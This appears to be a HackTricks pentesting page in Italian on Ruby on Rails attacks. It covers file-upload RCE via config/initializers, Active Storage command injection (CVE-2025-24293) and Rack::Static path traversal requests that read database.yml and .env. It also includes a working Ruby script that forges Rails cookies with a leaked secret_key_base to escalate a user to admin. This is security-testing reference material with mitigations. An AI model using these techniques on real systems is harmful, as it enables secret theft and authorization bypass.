# Trucchi Ruby

{{#include ../../banners/hacktricks-training.md}}

## Upload di file per RCE

Come spiegato in [this article](https://www.offsec.com/blog/cve-2024-46986/), caricare un file `.rb` in directory sensibili come `config/initializers/` può portare a remote code execution (RCE) in applicazioni Ruby on Rails.

Suggerimenti:
- Altre posizioni di boot/eager-load eseguite all'avvio dell'app sono rischiose se scrivibili (ad esempio, `config/initializers/` è quella classica). Se trovi un upload arbitrario che finisce da qualche parte sotto `config/` e viene poi valutato/required, potresti ottenere RCE all'avvio.
- Cerca build dev/staging che copiano file controllati dall'utente nell'immagine del container dove Rails li caricherà al boot.

## Active Storage image transformation → command execution (CVE-2025-24293)

Quando un'applicazione usa Active Storage con `image_processing` + `mini_magick`, e passa parametri non affidabili ai metodi di trasformazione immagine, le versioni di Rails precedenti a 7.1.5.2 / 7.2.2.2 / 8.0.2.1 potrebbero consentire command injection perché alcuni metodi di trasformazione erano erroneamente permessi di default.

- Un pattern vulnerabile appare così:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
dove `params[:t]` e/o `params[:v]` sono controllati dall'attaccante.

- Cosa provare durante il testing
- Individua endpoint che accettano opzioni variant/processing, nomi di trasformazione, o argomenti arbitrari di ImageMagick.
- Fuzz `params[:t]` e `params[:v]` per errori sospetti o effetti collaterali di esecuzione. Se riesci a influenzare il nome del metodo o passare argomenti raw che raggiungono MiniMagick, potresti ottenere code exec sull'host del processore di immagini.
- Se hai solo read-access ai variant generati, prova blind exfiltration tramite operazioni ImageMagick create ad arte.

- Mitigazione/rilevamento
- Se trovi Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 con Active Storage + `image_processing` + `mini_magick` e trasformazioni controllate dall'utente, consideralo sfruttabile. Raccomanda l'aggiornamento e l'applicazione di allowlists rigorose per metodi/parametri e di una policy di ImageMagick più restrittiva.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Se lo stack target usa direttamente Rack middleware o tramite framework, le versioni di `rack` precedenti a 2.2.13, 3.0.14 e 3.1.12 permettono Local File Inclusion tramite `Rack::Static` quando `:root` è unset/misconfigurato. Traversal codificati in `PATH_INFO` possono esporre file sotto la working directory del processo o una root inaspettata.

- Cerca app che montano `Rack::Static` in `config.ru` o negli stack di middleware. Prova traversal codificati contro percorsi statici, per esempio:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Adatta il prefisso per corrispondere ai `urls:` configurati. Se l'app risponde con il contenuto del file, probabilmente hai LFI verso qualsiasi cosa sotto il `:root` risolto.

- Mitigazione: aggiorna Rack; assicurati che `:root` punti solo a una directory di file pubblici ed è esplicitamente impostato.

## Forging/decrypting Rails cookies quando `secret_key_base` is leaked

Rails cripta e firma i cookie usando chiavi derivate da `secret_key_base`. Se quel valore leaks (ad esempio, in un repo, log o credenziali mal configurate), di solito puoi decriptare, modificare e ri-crittografare i cookie. Questo spesso porta a authz bypass se l'app memorizza ruoli, user ID o feature flags nei cookie.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
Note:
- Le app più vecchie possono usare AES-256-CBC e salts `encrypted cookie` / `signed encrypted cookie`, o JSON/Marshal serializers. Adatta salts, cipher e serializer di conseguenza.
- In caso di compromissione/valutazione, ruota `secret_key_base` per invalidare tutti i cookie esistenti.

## Vedi anche (vulnerabilità specifiche Ruby/Rails)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}



## Riferimenti

- Annuncio di sicurezza Rails: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1). https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670
- Avviso GitHub: Rack::Static Local File Inclusion (CVE-2025-27610). https://github.com/advisories/GHSA-7wqh-767x-r66v
{{#include ../../banners/hacktricks-training.md}}
